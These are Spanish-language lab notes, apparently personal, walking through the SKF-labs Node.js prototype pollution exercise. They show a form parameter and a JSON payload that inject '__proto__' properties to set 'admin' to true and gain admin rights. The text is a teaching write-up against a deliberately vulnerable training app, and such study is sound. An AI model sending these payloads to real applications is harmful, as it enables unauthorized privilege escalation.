Utilizaremos este laboratorio:
https://github.com/blabla1337/skf-labs/tree/master/nodeJs/Prototype-Pollution
![[Pasted image 20240523222345.png]]
Lo lanzamos:
![[Pasted image 20240523222421.png]]
Y veremos esto por el puerto 5000:
![[Pasted image 20240523222611.png]]
Nos creamos una cuenta pero no tenemos permisos privilegiados:
![[Pasted image 20240523222706.png]]
Si miramos el código de app.js, vemos que cuando somos admin la propiedad está en true, y si no pone false:
![[Pasted image 20240523222812.png]]
Se nos muestra que podemos enviar un mensaje al administrador:
![[Pasted image 20240523222839.png]]
Si interceptamos la petición, así es como se envía:
![[Pasted image 20240523223013.png]]
Para explotar la vulnerabilidad, añadimos lo siguiente y vemos un panel de /login:
```bash
email=pinguino%40pinguino.es&msg=prueba&__proto__[polluted]=yes
```
![[Pasted image 20240523223238.png]]
Ahora para explotar la vulnerabilidad, inyectamos el siguiente payload:
```bash
{
   "email": "info@pinguino.com",
   "msg": "hola",
   "__proto__":{
   "admin":true
   }
}
```
![[Pasted image 20240523224107.png]]
Enviamos la petición, y ahora somos admin:
![[Pasted image 20240523224132.png]]
